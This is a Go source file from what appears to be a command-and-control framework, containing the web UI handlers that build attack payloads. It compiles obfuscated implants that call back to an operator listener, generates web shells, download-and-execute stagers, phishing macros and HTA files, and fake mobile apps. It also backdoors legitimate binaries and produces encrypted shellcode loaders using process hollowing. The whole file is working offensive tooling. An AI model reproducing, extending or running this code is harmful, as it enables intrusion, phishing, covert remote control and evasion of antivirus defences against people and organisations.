package webui

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/payloads"
	"github.com/phantom-c2/phantom/internal/payloads/loader"
)

// PayloadRequest is the JSON body for payload generation.
type PayloadRequest struct {
	Type           string `json:"type"`            // exe, elf, aspx, php, android, ios, app, etc.
	ListenerURL    string `json:"listener_url"`    // C2 callback URL
	Sleep          int    `json:"sleep"`           // Agent sleep seconds
	Jitter         int    `json:"jitter"`          // Agent jitter percentage
	Obfuscate      bool   `json:"obfuscate"`       // Use garble (legacy boolean)
	ObfuscateLevel string `json:"obfuscate_level"` // "none" | "strip" | "garble"
	AppTemplate    string `json:"app_template"`    // For "app" type — template name
}

// PayloadResponse is returned after generation.
type PayloadResponse struct {
	Success  bool   `json:"success"`
	Message  string `json:"message"`
	Filename string `json:"filename,omitempty"`
	FilePath string `json:"filepath,omitempty"`
	Size     string `json:"size,omitempty"`
	Type     string `json:"type,omitempty"`
}

// handlePayloadTypes returns all available payload types.
func (w *WebUI) handlePayloadTypes(rw http.ResponseWriter, r *http.Request) {
	types := []map[string]interface{}{
		{"id": "exe", "name": "Windows EXE", "icon": "🪟", "category": "Agent Binary", "desc": "Windows executable agent (amd64)"},
		{"id": "exe-garble", "name": "Windows EXE (Stripped+UPX)", "icon": "🪟", "category": "Agent Binary", "desc": "Stripped symbols + UPX compressed (~2.6MB, 60% smaller)"},
		{"id": "elf", "name": "Linux ELF", "icon": "🐧", "category": "Agent Binary", "desc": "Linux executable agent (amd64)"},
		{"id": "elf-garble", "name": "Linux ELF (Stripped+UPX)", "icon": "🐧", "category": "Agent Binary", "desc": "Stripped symbols + UPX compressed (~2.4MB, 60% smaller)"},
		{"id": "darwin", "name": "macOS Mach-O", "icon": "🍎", "category": "Agent Binary", "desc": "macOS executable agent (darwin/amd64)"},
		{"id": "aspx", "name": "ASPX Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "ASP.NET web shell for IIS servers"},
		{"id": "php", "name": "PHP Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "PHP web shell with 5 exec fallbacks"},
		{"id": "jsp", "name": "JSP Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "Java web shell for Tomcat servers"},
		{"id": "powershell", "name": "PowerShell Stager", "icon": "💻", "category": "Stager", "desc": "Download & execute stager for Windows"},
		{"id": "bash", "name": "Bash Stager", "icon": "💻", "category": "Stager", "desc": "Download & execute stager for Linux"},
		{"id": "python", "name": "Python Stager", "icon": "🐍", "category": "Stager", "desc": "Cross-platform Python stager"},
		{"id": "hta", "name": "HTA Application", "icon": "📧", "category": "Phishing", "desc": "HTML Application for Windows phishing"},
		{"id": "vba", "name": "VBA Macro", "icon": "📧", "category": "Phishing", "desc": "Office macro for document phishing"},
		{"id": "android", "name": "Android Payload", "icon": "📱", "category": "Mobile", "desc": "Android stager + APK builder + phishing"},
		{"id": "ios", "name": "iOS Payload", "icon": "🍎", "category": "Mobile", "desc": "iOS MDM profile + Apple ID phishing"},
		{"id": "app", "name": "Fake Mobile App", "icon": "📲", "category": "Mobile", "desc": "Build fake app with C2 callback (30+ templates)"},
		{"id": "svc-exe", "name": "Windows Service EXE", "icon": "⚙️", "category": "Service", "desc": "Windows service binary — install with sc create, runs as SYSTEM"},
		{"id": "dll", "name": "DLL Payload", "icon": "📦", "category": "DLL", "desc": "DLL payload for sideloading or injection"},
		{"id": "shellcode-raw", "name": "Raw Shellcode", "icon": "💾", "category": "Shellcode", "desc": "Position-independent shellcode (.bin)"},
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(types)
}

// handlePayloadAppTemplates returns all mobile app templates.
func (w *WebUI) handlePayloadAppTemplates(rw http.ResponseWriter, r *http.Request) {
	var templates []map[string]interface{}
	for cat, apps := range payloads.AppTemplates {
		for _, app := range apps {
			templates = append(templates, map[string]interface{}{
				"name":     strings.ToLower(strings.ReplaceAll(app.Name, " ", "-")),
				"display":  app.Name,
				"icon":     app.Icon,
				"category": cat,
				"desc":     app.Description,
				"perms":    len(app.Permissions),
			})
		}
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(templates)
}

// handlePayloadGenerate builds the requested payload.
func (w *WebUI) handlePayloadGenerate(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		rw.Header().Set("Content-Type", "application/json")
		json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "POST required"})
		return
	}

	var req PayloadRequest
	json.NewDecoder(r.Body).Decode(&req)

	if req.ListenerURL == "" {
		req.ListenerURL = "https://127.0.0.1:443"
	}
	if req.Sleep <= 0 {
		req.Sleep = 10
	}
	if req.Jitter <= 0 {
		req.Jitter = 20
	}

	rw.Header().Set("Content-Type", "application/json")

	switch req.Type {
	case "exe", "elf", "exe-garble", "elf-garble", "svc-exe", "dll", "darwin":
		resp := w.buildAgentBinary(req)
		json.NewEncoder(rw).Encode(resp)

	case "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba":
		resp := w.generateWebPayload(req)
		json.NewEncoder(rw).Encode(resp)

	case "android":
		// Try to build a ready-to-install APK — uses template if app_template is set
		apkPath, err := payloads.BuildAndroidAPKWithTemplate(req.ListenerURL, "build/payloads", req.AppTemplate)
		if err == nil {
			info, _ := os.Stat(apkPath)
			size := "unknown"
			if info != nil {
				size = fmt.Sprintf("%.1f KB", float64(info.Size())/1024)
			}
			templateLabel := "System Update"
			if req.AppTemplate != "" {
				templateLabel = req.AppTemplate
			}
			AddPayloadRecord("android-"+templateLabel, filepath.Base(apkPath), apkPath, size, req.ListenerURL)
			json.NewEncoder(rw).Encode(PayloadResponse{
				Success:  true,
				Message:  fmt.Sprintf("Android APK built: %s (%s)\nTemplate: %s\nInstall: adb install %s", apkPath, size, templateLabel, apkPath),
				Filename: filepath.Base(apkPath),
				FilePath: apkPath,
				Size:     size,
				Type:     "android",
			})
		} else {
			// Fallback: generate stager scripts if SDK not available
			output, err2 := payloads.GenerateAndroidPayload(req.ListenerURL, "build/payloads")
			if err2 != nil {
				json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: fmt.Sprintf("APK build failed: %v\nScript fallback also failed: %v", err, err2)})
			} else {
				json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: fmt.Sprintf("APK build unavailable (%v)\nGenerated stager scripts instead:\n%s", err, output), Type: "android", FilePath: "build/payloads/"})
			}
		}

	case "ios":
		output, err := payloads.GenerateIOSPayload(req.ListenerURL, "build/payloads")
		if err != nil {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: err.Error()})
		} else {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: output, Type: "ios", FilePath: "build/payloads/"})
		}

	case "app":
		if req.AppTemplate == "" {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "Select a template from the dropdown"})
			return
		}
		// Build a ready-to-install APK using the selected template
		apkPath, err := payloads.BuildAndroidAPKWithTemplate(req.ListenerURL, "build/payloads", req.AppTemplate)
		if err != nil {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: fmt.Sprintf("APK build failed: %v", err)})
		} else {
			info, _ := os.Stat(apkPath)
			size := "unknown"
			if info != nil {
				size = fmt.Sprintf("%.1f KB", float64(info.Size())/1024)
			}
			AddPayloadRecord("app-"+req.AppTemplate, filepath.Base(apkPath), apkPath, size, req.ListenerURL)
			json.NewEncoder(rw).Encode(PayloadResponse{
				Success:  true,
				Message:  fmt.Sprintf("Fake app APK built: %s (%s)\nTemplate: %s\nInstall: adb install %s\nDelivery: http://C2:8080/app", apkPath, size, req.AppTemplate, apkPath),
				Filename: filepath.Base(apkPath),
				FilePath: apkPath,
				Size:     size,
				Type:     "app",
			})
		}

	default:
		json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "Unknown payload type: " + req.Type})
	}
}

// buildAgentBinary cross-compiles an agent binary.
func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
	targetOS := "linux"
	targetArch := "amd64"
	obfuscate := false
	stripOnly := false // strip symbols only, no garble

	buildMode := ""

	switch req.Type {
	case "exe":
		targetOS = "windows"
	case "exe-garble":
		targetOS = "windows"
		obfuscate = true
	case "elf-garble":
		obfuscate = true
	case "darwin":
		targetOS = "darwin"
	case "svc-exe":
		targetOS = "windows"
		buildMode = "service"
	case "dll":
		targetOS = "windows"
		buildMode = "dll"
	}

	// ObfuscateLevel overrides type-based obfuscation for base types (exe, elf, darwin)
	switch req.ObfuscateLevel {
	case "garble":
		obfuscate = true
		stripOnly = false
	case "strip":
		obfuscate = false
		stripOnly = true
	case "none":
		obfuscate = false
		stripOnly = false
	}

	os.MkdirAll("build/agents", 0755)

	ext := ""
	if targetOS == "windows" {
		ext = ".exe"
	}
	if buildMode == "dll" {
		ext = ".dll"
	}
	suffix := ""
	if obfuscate {
		suffix = "_garbled"
	} else if stripOnly {
		suffix = "_stripped"
	}
	filename := fmt.Sprintf("phantom-agent_%s_%s%s%s", targetOS, targetArch, suffix, ext)
	if buildMode == "service" {
		filename = fmt.Sprintf("phantom-svc_%s_%s%s%s", targetOS, targetArch, suffix, ext)
	}
	if buildMode == "dll" {
		filename = fmt.Sprintf("phantom-agent_%s_%s%s", targetOS, targetArch, ext)
	}
	outputPath := filepath.Join("build", "agents", filename)

	// Build ldflags
	module := "github.com/phantom-c2/phantom/internal/implant"
	ldflags := fmt.Sprintf("-s -w -X '%s.ListenerURL=%s' -X '%s.SleepSeconds=%d' -X '%s.JitterPercent=%d'",
		module, req.ListenerURL, module, req.Sleep, module, req.Jitter)

	// Embed public key if available
	if w.server.PubKey != nil {
		keyBytes, err := crypto.PublicKeyToBytes(w.server.PubKey)
		if err == nil {
			b64Key := crypto.Base64Encode(keyBytes)
			ldflags += fmt.Sprintf(" -X '%s.ServerPubKey=%s'", module, b64Key)
		}
	}

	// Add service-specific flags
	if buildMode == "service" {
		ldflags += fmt.Sprintf(" -X '%s.RunAsService=true'", module)
	}

	// Set environment
	env := os.Environ()
	env = setEnvVar(env, "GOOS", targetOS)
	env = setEnvVar(env, "GOARCH", targetArch)
	if buildMode == "dll" {
		env = setEnvVar(env, "CGO_ENABLED", "1")
		env = setEnvVar(env, "CC", "x86_64-w64-mingw32-gcc")
	} else {
		env = setEnvVar(env, "CGO_ENABLED", "0")
	}

	// Find project root
	projectRoot := findRoot()

	// DLL: c-shared buildmode targeting cmd/agent-dll
	if buildMode == "dll" {
		dllCmd := exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent-dll")
		dllCmd.Dir = projectRoot
		dllCmd.Env = env
		if out, err := dllCmd.CombinedOutput(); err != nil {
			return PayloadResponse{Success: false, Message: fmt.Sprintf("DLL build failed: %s\n%s", err, strings.TrimSpace(string(out)))}
		}
		info, _ := os.Stat(outputPath)
		size := "unknown"
		if info != nil {
			size = fmt.Sprintf("%.1f MB", float64(info.Size())/1024/1024)
		}
		AddPayloadRecord("dll", filepath.Base(outputPath), outputPath, size, req.ListenerURL)
		return PayloadResponse{
			Success:  true,
			Message:  fmt.Sprintf("DLL built: %s (%s)\n\nExecution methods:\n  rundll32.exe %s,Start\n  regsvr32 /s /i %s\n  regsvr32 /s %s", outputPath, size, outputPath, outputPath, outputPath),
			Filename: filepath.Base(outputPath),
			FilePath: outputPath,
			Size:     size,
			Type:     "dll",
		}
	}

	built := false

	if obfuscate {
		// Try garble first
		garblePath := ""
		if p, err := exec.LookPath("garble"); err == nil {
			garblePath = p
		} else {
			home, _ := os.UserHomeDir()
			for _, c := range []string{
				filepath.Join(home, "go", "bin", "garble"),
				"/usr/local/go/bin/garble",
				"/usr/local/bin/garble",
			} {
				if _, e := os.Stat(c); e == nil {
					garblePath = c
					break
				}
			}
		}

		if garblePath != "" {
			garbleCmd := exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
				"build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
			garbleCmd.Dir = projectRoot
			garbleCmd.Env = append(env, "GOTOOLCHAIN=local")
			if _, err := garbleCmd.CombinedOutput(); err == nil {
				built = true
			}
		}

		if !built {
			// Fallback: stripped build + UPX compression
			fallbackCmd := exec.Command("go", "build", "-ldflags", ldflags+" -s -w", "-trimpath", "-o", outputPath, "./cmd/agent")
			fallbackCmd.Dir = projectRoot
			fallbackCmd.Env = env
			if out, err := fallbackCmd.CombinedOutput(); err != nil {
				return PayloadResponse{Success: false, Message: fmt.Sprintf("build failed: %s", strings.TrimSpace(string(out)))}
			}
			built = true
		}

		// UPX pack for smaller size
		if upxPath, err := exec.LookPath("upx"); err == nil {
			exec.Command(upxPath, "-9", "-q", outputPath).Run()
		}
	}

	if !built {
		agentPkg := "./cmd/agent"
		if targetOS == "darwin" {
			agentPkg = "./cmd/agent-darwin"
		}
		// Strip level: add -s -w -trimpath but skip garble
		stripFlags := ldflags
		if stripOnly {
			stripFlags = ldflags + " -s -w"
		}
		buildArgs := []string{"build", "-trimpath", "-ldflags", stripFlags, "-o", outputPath, agentPkg}
		if !stripOnly {
			// Plain build without -trimpath for easier debugging
			buildArgs = []string{"build", "-ldflags", ldflags, "-o", outputPath, agentPkg}
		}
		buildCmd := exec.Command("go", buildArgs...)
		buildCmd.Dir = projectRoot
		buildCmd.Env = env
		if out, err := buildCmd.CombinedOutput(); err != nil {
			return PayloadResponse{Success: false, Message: fmt.Sprintf("Build failed: %s\n%s", err, string(out))}
		}
	}

	info, _ := os.Stat(outputPath)
	size := "unknown"
	if info != nil {
		mb := float64(info.Size()) / 1024 / 1024
		size = fmt.Sprintf("%.1f MB", mb)
	}

	AddPayloadRecord(req.Type, filename, outputPath, size, req.ListenerURL)

	return PayloadResponse{
		Success:  true,
		Message:  fmt.Sprintf("Agent built: %s/%s (%s)", targetOS, targetArch, size),
		Filename: filename,
		FilePath: outputPath,
		Size:     size,
		Type:     req.Type,
	}
}

// generateWebPayload creates web shells and stagers.
func (w *WebUI) generateWebPayload(req PayloadRequest) PayloadResponse {
	cfg := payloads.PayloadConfig{
		Type:        payloads.PayloadType(req.Type),
		ListenerURL: req.ListenerURL,
		OutputPath:  "build/payloads",
	}

	outPath, err := payloads.Generate(cfg)
	if err != nil {
		return PayloadResponse{Success: false, Message: err.Error()}
	}

	info, _ := os.Stat(outPath)
	size := "unknown"
	if info != nil {
		size = fmt.Sprintf("%d bytes", info.Size())
	}

	// Record in payload history
	AddPayloadRecord(req.Type, filepath.Base(outPath), outPath, size, req.ListenerURL)

	return PayloadResponse{
		Success:  true,
		Message:  fmt.Sprintf("Payload generated: %s", outPath),
		Filename: filepath.Base(outPath),
		FilePath: outPath,
		Size:     size,
		Type:     req.Type,
	}
}

func setEnvVar(env []string, key, value string) []string {
	prefix := key + "="
	for i, e := range env {
		if strings.HasPrefix(e, prefix) {
			env[i] = prefix + value
			return env
		}
	}
	return append(env, prefix+value)
}

// handlePayloadDownload serves a generated payload file for browser download.
func (w *WebUI) handlePayloadDownload(rw http.ResponseWriter, r *http.Request) {
	filePath := r.URL.Query().Get("file")
	if filePath == "" {
		http.Error(rw, "file parameter required", 400)
		return
	}

	// Security: only allow downloads from build/ directory
	absPath, err := filepath.Abs(filePath)
	if err != nil {
		http.Error(rw, "invalid path", 400)
		return
	}
	buildDir, _ := filepath.Abs("build")
	if !strings.HasPrefix(absPath, buildDir) {
		http.Error(rw, "access denied", 403)
		return
	}

	// Check file exists
	info, err := os.Stat(absPath)
	if err != nil {
		http.Error(rw, "file not found", 404)
		return
	}

	// Set download headers
	filename := filepath.Base(absPath)
	rw.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	rw.Header().Set("Content-Length", fmt.Sprintf("%d", info.Size()))

	// Set content type based on extension
	ext := strings.ToLower(filepath.Ext(filename))
	switch ext {
	case ".exe":
		rw.Header().Set("Content-Type", "application/x-msdownload")
	case ".php", ".jsp", ".aspx", ".py", ".sh", ".ps1", ".vba", ".hta":
		rw.Header().Set("Content-Type", "text/plain")
	case ".html":
		rw.Header().Set("Content-Type", "text/html")
	case ".xml":
		rw.Header().Set("Content-Type", "application/xml")
	case ".mobileconfig":
		rw.Header().Set("Content-Type", "application/x-apple-aspen-config")
	default:
		rw.Header().Set("Content-Type", "application/octet-stream")
	}

	http.ServeFile(rw, r, absPath)
}

func findRoot() string {
	dir, _ := os.Getwd()
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	if runtime.GOOS == "linux" {
		home, _ := os.UserHomeDir()
		if _, err := os.Stat(filepath.Join(home, "phantom", "go.mod")); err == nil {
			return filepath.Join(home, "phantom")
		}
	}
	return "."
}

// ══════════════════════════════════════════
//  BACKDOOR GENERATION API
// ══════════════════════════════════════════

func (w *WebUI) handleBackdoorTypes(rw http.ResponseWriter, r *http.Request) {
	types := payloads.ListBackdoorTypes()
	writeJSON(rw, types)
}

func (w *WebUI) handleBinaryBackdoor(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}

	var req struct {
		InputPath   string `json:"input"`
		OutputPath  string `json:"output"`
		ListenerURL string `json:"listener_url"`
		AgentPath   string `json:"agent_path"`
		Obfuscate   bool   `json:"obfuscate"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	if req.InputPath == "" || req.ListenerURL == "" {
		writeJSON(rw, map[string]string{"error": "input binary path and listener_url required"})
		return
	}

	if req.OutputPath == "" {
		ext := filepath.Ext(req.InputPath)
		base := strings.TrimSuffix(filepath.Base(req.InputPath), ext)
		suffix := "_backdoored"
		if req.Obfuscate {
			suffix = "_backdoored_garbled"
		}
		req.OutputPath = filepath.Join("build", "payloads", "backdoored", base+suffix+ext)
	}

	// Embed server public key so agent can register
	var serverPubKeyB64 string
	if w.server.PubKey != nil {
		if keyBytes, err := crypto.PublicKeyToBytes(w.server.PubKey); err == nil {
			serverPubKeyB64 = crypto.Base64Encode(keyBytes)
		}
	}

	cfg := payloads.BinaryBackdoorConfig{
		InputBinary:  req.InputPath,
		OutputBinary: req.OutputPath,
		ListenerURL:  req.ListenerURL,
		AgentBinary:  req.AgentPath,
		Obfuscate:    req.Obfuscate,
		ServerPubKey: serverPubKeyB64,
	}

	outPath, err := payloads.BackdoorBinary(cfg)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	info, _ := os.Stat(outPath)
	size := "unknown"
	if info != nil {
		size = fmt.Sprintf("%.2f MB", float64(info.Size())/(1024*1024))
	}

	writeJSON(rw, map[string]interface{}{
		"success":  true,
		"message":  fmt.Sprintf("Binary backdoored: %s", outPath),
		"filepath": outPath,
		"size":     size,
	})
}

func (w *WebUI) handleBackdoorGenerate(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}

	var req struct {
		Type        string `json:"type"`
		ListenerURL string `json:"listener_url"`
		TargetApp   string `json:"target_app"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	if req.Type == "" || req.ListenerURL == "" {
		writeJSON(rw, map[string]string{"error": "type and listener_url required"})
		return
	}

	root := findRoot()
	outputDir := filepath.Join(root, "build", "payloads", "backdoors", req.Type)

	cfg := payloads.BackdoorConfig{
		Type:        payloads.BackdoorType(req.Type),
		ListenerURL: req.ListenerURL,
		TargetApp:   req.TargetApp,
		OutputDir:   outputDir,
	}

	outPath, err := payloads.GenerateBackdoor(cfg)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(rw, map[string]interface{}{
		"success":  true,
		"message":  fmt.Sprintf("Backdoor generated: %s", outPath),
		"filepath": outPath,
		"type":     req.Type,
	})
}

// ══════════════════════════════════════════
//  SHELLCODE LOADER GENERATOR
// ══════════════════════════════════════════

func (w *WebUI) handleLoaderGenerate(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}

	var req struct {
		ListenerURL string `json:"listener_url"`
		LoaderType  string `json:"loader_type"` // syscall, dll, hollowing, fiber
		AgentType   string `json:"agent_type"`  // exe, elf
	}
	json.NewDecoder(r.Body).Decode(&req)

	if req.ListenerURL == "" {
		writeJSON(rw, map[string]string{"error": "listener_url required"})
		return
	}
	if req.LoaderType == "" {
		req.LoaderType = "syscall"
	}
	if req.AgentType == "" {
		req.AgentType = "exe"
	}

	root := findRoot()
	outputDir := filepath.Join(root, "build", "loaders", req.LoaderType)

	// Find the agent binary to encrypt
	agentPath := filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
	if req.AgentType == "elf" {
		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
	}
	if _, err := os.Stat(agentPath); err != nil {
		writeJSON(rw, map[string]string{"error": "Agent binary not found. Generate a payload first."})
		return
	}

	cfg := loader.LoaderConfig{
		StagerURL:  req.ListenerURL,
		OutputDir:  outputDir,
		LoaderType: req.LoaderType,
		TargetOS:   "windows",
		TargetArch: "amd64",
	}

	result, err := loader.GenerateLoader(agentPath, cfg)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	resp := map[string]interface{}{
		"success":           true,
		"loader_type":       req.LoaderType,
		"encrypted_payload": result.EncryptedPayload,
		"key":              result.Key[:16] + "...",
		"instructions":     result.Instructions,
	}

	if result.LoaderPath != "" {
		resp["loader_path"] = result.LoaderPath
		resp["message"] = fmt.Sprintf("Loader compiled: %s", result.LoaderPath)
	} else {
		resp["source_path"] = filepath.Join(outputDir, "loader.c")
		resp["message"] = "Loader source generated. Compile with: x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet -s -mwindows"
	}

	writeJSON(rw, resp)
}

const binaryStageDir = "build/payloads/staged"

// handleListBinaries returns all staged input binaries available for backdooring.
func (w *WebUI) handleListBinaries(rw http.ResponseWriter, r *http.Request) {
	os.MkdirAll(binaryStageDir, 0755)
	entries, err := os.ReadDir(binaryStageDir)
	if err != nil {
		writeJSON(rw, []interface{}{})
		return
	}

	type BinaryEntry struct {
		Name string `json:"name"`
		Path string `json:"path"`
		Size string `json:"size"`
		Ext  string `json:"ext"`
	}

	var result []BinaryEntry
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		info, _ := e.Info()
		size := "?"
		if info != nil {
			kb := float64(info.Size()) / 1024
			if kb >= 1024 {
				size = fmt.Sprintf("%.1f MB", kb/1024)
			} else {
				size = fmt.Sprintf("%.0f KB", kb)
			}
		}
		path := filepath.Join(binaryStageDir, e.Name())
		result = append(result, BinaryEntry{
			Name: e.Name(),
			Path: path,
			Size: size,
			Ext:  strings.ToLower(filepath.Ext(e.Name())),
		})
	}
	if result == nil {
		result = []BinaryEntry{}
	}
	writeJSON(rw, result)
}

// handleUploadBinary accepts a multipart upload and saves it to the stage directory.
func (w *WebUI) handleUploadBinary(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}
	r.ParseMultipartForm(100 << 20) // 100 MB max
	file, header, err := r.FormFile("file")
	if err != nil {
		writeJSON(rw, map[string]string{"error": "no file provided"})
		return
	}
	defer file.Close()

	os.MkdirAll(binaryStageDir, 0755)
	destPath := filepath.Join(binaryStageDir, filepath.Base(header.Filename))

	// Read and write
	data := make([]byte, header.Size)
	n, _ := file.Read(data)
	if err := os.WriteFile(destPath, data[:n], 0755); err != nil {
		writeJSON(rw, map[string]string{"error": "failed to save file: " + err.Error()})
		return
	}

	writeJSON(rw, map[string]interface{}{
		"success": true,
		"name":    header.Filename,
		"path":    destPath,
		"size":    fmt.Sprintf("%.1f KB", float64(n)/1024),
	})
}
